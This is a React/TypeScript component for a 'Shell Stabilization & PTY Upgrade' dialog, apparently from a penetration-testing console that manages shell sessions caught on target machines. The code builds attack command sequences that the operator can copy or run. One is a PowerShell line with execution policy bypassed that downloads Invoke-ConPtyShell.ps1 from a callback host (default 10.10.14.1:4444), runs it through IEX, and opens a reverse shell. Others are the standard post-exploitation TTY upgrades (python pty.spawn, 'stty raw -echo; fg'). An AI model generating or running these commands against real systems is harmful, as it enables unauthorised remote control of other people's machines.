import React, { useEffect, useMemo, useState } from 'react';

export type ShellStabilizeMethod = 'python3' | 'python' | 'script' | 'perl' | 'conptyshell';
export type ShellStabilizeMode = 'direct' | 'nested_nc' | 'windows_conpty';

export interface ShellStabilizeRequest {
  sessionId: string;
  method: ShellStabilizeMethod;
  mode: ShellStabilizeMode;
  shellPath: string;
  term: string;
  cols: number;
  rows: number;
  lhost?: string;
  lport?: number;
}

export interface ShellStabilizeModalProps {
  isOpen: boolean;
  sessionId: string;
  sessionTitle: string;
  isRawTcp: boolean;
  initialCols: number;
  initialRows: number;
  onStabilize: (req: ShellStabilizeRequest) => Promise<void>;
  onClose: () => void;
}

export function ShellStabilizeModal({
  isOpen,
  sessionId,
  sessionTitle,
  isRawTcp,
  initialCols,
  initialRows,
  onStabilize,
  onClose,
}: ShellStabilizeModalProps): React.JSX.Element | null {
  const [mode, setMode] = useState<ShellStabilizeMode>(isRawTcp ? 'direct' : 'nested_nc');
  const [method, setMethod] = useState<ShellStabilizeMethod>('python3');
  const [shellPath, setShellPath] = useState<string>('/bin/bash');
  const [term, setTerm] = useState<string>('xterm-256color');
  const [cols, setCols] = useState<number>(initialCols || 120);
  const [rows, setRows] = useState<number>(initialRows || 32);
  const [lhost, setLhost] = useState<string>('10.10.14.1');
  const [lport, setLport] = useState<number>(4444);
  const [isRunning, setIsRunning] = useState<boolean>(false);
  const [copied, setCopied] = useState<boolean>(false);
  const [errorMsg, setErrorMsg] = useState<string>('');

  useEffect(() => {
    if (isOpen) {
      setMode(isRawTcp ? 'direct' : 'nested_nc');
      setCols(initialCols || 120);
      setRows(initialRows || 32);
      setErrorMsg('');
      setCopied(false);
    }
  }, [isOpen, isRawTcp, initialCols, initialRows]);

  const previewSteps = useMemo(() => {
    if (mode === 'windows_conpty' || method === 'conptyshell') {
      return [
        `powershell -NoP -NonI -Exec Bypass -Command "IEX(IWR http://${lhost}:${lport}/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell ${lhost} ${lport} -Rows ${rows} -Cols ${cols}"`,
      ];
    }

    let spawn = `python3 -c 'import pty; pty.spawn("${shellPath}")'`;
    if (method === 'python') {
      spawn = `python -c 'import pty; pty.spawn("${shellPath}")'`;
    } else if (method === 'script') {
      spawn = `script -qc ${shellPath} /dev/null`;
    } else if (method === 'perl') {
      spawn = `perl -e 'exec "${shellPath}";'`;
    }

    const resize = `export TERM=${term} SHELL=${shellPath}; stty rows ${rows} cols ${cols}`;

    if (mode === 'nested_nc') {
      return [
        spawn,
        '^Z  (Ctrl+Z — background outer netcat)',
        'stty raw -echo; fg',
        resize,
      ];
    }

    return [spawn, resize];
  }, [mode, method, shellPath, term, cols, rows, lhost, lport]);

  if (!isOpen) return null;

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsRunning(true);
    setErrorMsg('');
    try {
      await onStabilize({
        sessionId,
        method,
        mode,
        shellPath,
        term,
        cols,
        rows,
        lhost,
        lport,
      });
      onClose();
    } catch (err: unknown) {
      setErrorMsg(`Stabilization failed: ${err instanceof Error ? err.message : String(err)}`);
    } finally {
      setIsRunning(false);
    }
  };

  const handleCopySequence = async () => {
    try {
      await navigator.clipboard.writeText(previewSteps.join('\n'));
      setCopied(true);
      setTimeout(() => setCopied(false), 1800);
    } catch {
      // ignore clipboard failures in restricted environments
    }
  };

  return (
    <div
      className="modal-backdrop cyber-modal-overlay"
      role="dialog"
      aria-modal="true"
      aria-label="Shell Stabilization & PTY Upgrade (F-34)"
      onClick={(e) => {
        if (e.target === e.currentTarget && !isRunning) onClose();
      }}
    >
      <div
        className="cyber-dialog-card"
        style={{
          maxWidth: '680px',
          width: '95vw',
          maxHeight: '90vh',
          display: 'flex',
          flexDirection: 'column',
          overflow: 'hidden',
          position: 'relative',
          padding: 0,
        }}
      >
        <div className="cyber-corner-reticle cyber-corner-tl" />
        <div className="cyber-corner-reticle cyber-corner-tr" />
        <div className="cyber-corner-reticle cyber-corner-bl" />
        <div className="cyber-corner-reticle cyber-corner-br" />

        {/* Pinned Header */}
        <div className="dialog-header" style={{ flexShrink: 0 }}>
          <div className="dialog-title">
            <span className="cyber-hazard-stripes">///</span>
            <div>
              <h3 style={{ margin: 0, fontSize: '0.98rem', color: '#00f0ff', letterSpacing: '0.06em' }}>
                🐚 Shell Stabilization &amp; PTY Upgrade (F-34)
              </h3>
              <div
                style={{
                  fontSize: '0.7rem',
                  color: '#38bdf8',
                  fontFamily: 'JetBrains Mono, Consolas, monospace',
                  marginTop: '2px',
                  letterSpacing: '0.04em',
                }}
              >
                PTY-UPGRADE // RAW SHELL &rarr; FULL INTERACTIVE TERMINAL
              </div>
            </div>
          </div>
          <button
            type="button"
            className="cyber-btn-close"
            onClick={onClose}
            aria-label="Close dialog"
          >
            ×
          </button>
        </div>

        <form
          onSubmit={handleSubmit}
          style={{ display: 'flex', flexDirection: 'column', flex: 1, minHeight: 0 }}
        >
          {/* Scrollable Body */}
          <div
            className="dialog-body"
            style={{
              flex: 1,
              minHeight: 0,
              overflowY: 'auto',
              padding: '1.25rem',
              display: 'flex',
              flexDirection: 'column',
              gap: '0.85rem',
            }}
          >
            {errorMsg && <div className="error-banner">{errorMsg}</div>}

            {/* Active Session Telemetry */}
            <div
              style={{
                background: 'rgba(0, 240, 255, 0.05)',
                border: '1px solid rgba(0, 240, 255, 0.25)',
                padding: '0.55rem 0.85rem',
                display: 'flex',
                alignItems: 'center',
                justifyContent: 'space-between',
                fontSize: '0.75rem',
                fontFamily: 'JetBrains Mono, Consolas, monospace',
              }}
            >
              <div>
                <span style={{ color: '#94a3b8' }}>TARGET SESSION: </span>
                <strong style={{ color: '#00f0ff' }}>{sessionTitle || sessionId}</strong>
              </div>
              <div>
                <span style={{ color: '#94a3b8' }}>GEOMETRY: </span>
                <strong style={{ color: '#38bdf8' }}>
                  {cols}×{rows}
                </strong>
              </div>
            </div>

            <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '0.75rem' }}>
              <div>
                <label className="cyber-label" htmlFor="stab-mode">
                  Session Topology Mode
                </label>
                <select
                  id="stab-mode"
                  className="cyber-hud-select"
                  value={mode}
                  onChange={(e) => {
                    const nextMode = e.target.value as ShellStabilizeMode;
                    setMode(nextMode);
                    if (nextMode === 'windows_conpty') {
                      setMethod('conptyshell');
                    } else if (method === 'conptyshell') {
                      setMethod('python3');
                    }
                  }}
                >
                  <option value="direct">⚡ Direct Raw Socket / Listener (No Ctrl+Z)</option>
                  <option value="nested_nc">🔄 Nested Netcat in SSH (Ctrl+Z + stty raw -echo; fg)</option>
                  <option value="windows_conpty">🪟 Windows ConPtyShell Upgrade</option>
                </select>
              </div>

              <div>
                <label className="cyber-label" htmlFor="stab-method">
                  PTY Spawn Method
                </label>
                <select
                  id="stab-method"
                  className="cyber-hud-select"
                  value={method}
                  onChange={(e) => {
                    const nextMethod = e.target.value as ShellStabilizeMethod;
                    setMethod(nextMethod);
                    if (nextMethod === 'conptyshell') {
                      setMode('windows_conpty');
                    } else if (mode === 'windows_conpty') {
                      setMode(isRawTcp ? 'direct' : 'nested_nc');
                    }
                  }}
                >
                  <option value="python3">🐍 Python 3 (pty.spawn)</option>
                  <option value="python">🐍 Python 2 (pty.spawn)</option>
                  <option value="script">📜 script -qc /dev/null</option>
                  <option value="perl">🐪 Perl exec</option>
                  <option value="conptyshell">🪟 Windows ConPtyShell</option>
                </select>
              </div>
            </div>

            {mode === 'windows_conpty' || method === 'conptyshell' ? (
              <div style={{ display: 'grid', gridTemplateColumns: '2fr 1fr 1fr 1fr', gap: '0.75rem' }}>
                <div>
                  <label className="cyber-label" htmlFor="stab-lhost">
                    Callback LHOST
                  </label>
                  <input
                    id="stab-lhost"
                    className="cyber-hud-input font-mono"
                    value={lhost}
                    onChange={(e) => setLhost(e.target.value)}
                    placeholder="10.10.14.1"
                  />
                </div>
                <div>
                  <label className="cyber-label" htmlFor="stab-lport">
                    LPORT
                  </label>
                  <input
                    id="stab-lport"
                    type="number"
                    className="cyber-hud-input font-mono"
                    value={lport}
                    onChange={(e) => setLport(Number(e.target.value) || 4444)}
                  />
                </div>
                <div>
                  <label className="cyber-label" htmlFor="stab-cols">
                    Cols
                  </label>
                  <input
                    id="stab-cols"
                    type="number"
                    className="cyber-hud-input font-mono"
                    value={cols}
                    onChange={(e) => setCols(Number(e.target.value) || 120)}
                  />
                </div>
                <div>
                  <label className="cyber-label" htmlFor="stab-rows">
                    Rows
                  </label>
                  <input
                    id="stab-rows"
                    type="number"
                    className="cyber-hud-input font-mono"
                    value={rows}
                    onChange={(e) => setRows(Number(e.target.value) || 32)}
                  />
                </div>
              </div>
            ) : (
              <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr 85px 85px', gap: '0.75rem' }}>
                <div>
                  <label className="cyber-label" htmlFor="stab-shell">
                    Target Shell Binary
                  </label>
                  <select
                    id="stab-shell"
                    className="cyber-hud-select font-mono"
                    value={shellPath}
                    onChange={(e) => setShellPath(e.target.value)}
                  >
                    <option value="/bin/bash">/bin/bash</option>
                    <option value="/bin/sh">/bin/sh</option>
                    <option value="/bin/zsh">/bin/zsh</option>
                    <option value="/bin/ash">/bin/ash</option>
                  </select>
                </div>
                <div>
                  <label className="cyber-label" htmlFor="stab-term">
                    TERM Type
                  </label>
                  <input
                    id="stab-term"
                    className="cyber-hud-input font-mono"
                    value={term}
                    onChange={(e) => setTerm(e.target.value)}
                  />
                </div>
                <div>
                  <label className="cyber-label" htmlFor="stab-cols">
                    Cols
                  </label>
                  <input
                    id="stab-cols"
                    type="number"
                    className="cyber-hud-input font-mono"
                    value={cols}
                    onChange={(e) => setCols(Number(e.target.value) || 120)}
                  />
                </div>
                <div>
                  <label className="cyber-label" htmlFor="stab-rows">
                    Rows
                  </label>
                  <input
                    id="stab-rows"
                    type="number"
                    className="cyber-hud-input font-mono"
                    value={rows}
                    onChange={(e) => setRows(Number(e.target.value) || 32)}
                  />
                </div>
              </div>
            )}

            {/* Sequence Preview */}
            <div>
              <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '4px' }}>
                <label className="cyber-label" style={{ margin: 0 }}>
                  Execution Sequence Preview
                </label>
                <button
                  type="button"
                  className="cyber-btn"
                  style={{ padding: '2px 8px', fontSize: '0.7rem' }}
                  onClick={() => void handleCopySequence()}
                >
                  {copied ? '✓ Copied' : '📋 Copy Commands'}
                </button>
              </div>
              <div
                className="font-mono"
                style={{
                  background: 'rgba(2, 6, 12, 0.9)',
                  border: '1px solid rgba(0, 240, 255, 0.25)',
                  padding: '0.75rem',
                  fontSize: '0.76rem',
                  color: '#a5f3fc',
                  display: 'flex',
                  flexDirection: 'column',
                  gap: '0.35rem',
                }}
              >
                {previewSteps.map((step, idx) => (
                  <div key={idx} style={{ display: 'flex', gap: '0.5rem' }}>
                    <span style={{ color: '#64748b', userSelect: 'none' }}>{idx + 1}.</span>
                    <span style={{ wordBreak: 'break-all' }}>{step}</span>
                  </div>
                ))}
              </div>
            </div>
          </div>

          {/* Pinned Footer */}
          <div className="dialog-footer" style={{ flexShrink: 0 }}>
            <button
              type="button"
              className="cyber-btn cyber-btn-secondary"
              onClick={onClose}
              disabled={isRunning}
            >
              Cancel
            </button>
            <button
              type="submit"
              className="cyber-btn cyber-btn-primary"
              disabled={isRunning}
            >
              {isRunning ? 'Stabilizing...' : '⚡ Stabilize Shell Now'}
            </button>
          </div>
        </form>
      </div>
    </div>
  );
}
